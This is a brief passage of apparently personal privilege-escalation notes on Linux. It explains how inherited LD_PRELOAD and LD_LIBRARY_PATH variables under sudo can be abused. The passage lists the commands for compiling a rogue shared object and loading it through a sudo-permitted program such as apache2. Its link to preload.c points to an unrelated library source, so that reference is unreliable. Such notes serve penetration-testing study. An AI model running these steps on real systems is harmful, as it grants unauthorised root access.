Check for inherited environment variables: `sudo -l`

### LD_PRELOAD and LD_LIBRARY_PATH

LD_PRELOAD: Creates a shared object before any others when a program is run

1. Create a shared object using [preload.c](https://github.com/stephenrkell/liballocs/blob/master/src/preload.c): `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
2. Create a path for a program to the new shared object: `sudo LD_PRELOAD=/tmp/preload.so [program you can run with sudo]`

LD_LIBRARY_PATH: Provides a list of directories where shared libraries are searched for first

1. Check which share libraries are used by the program: `ldd /usr/sbin/apache2`
2. Create a shared object with the name of one of the listed libraries: `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`
3. Run the program telling it to look at the directory where you created the object first: `sudo LD_LIBRARY_PATH=/tmp apache2`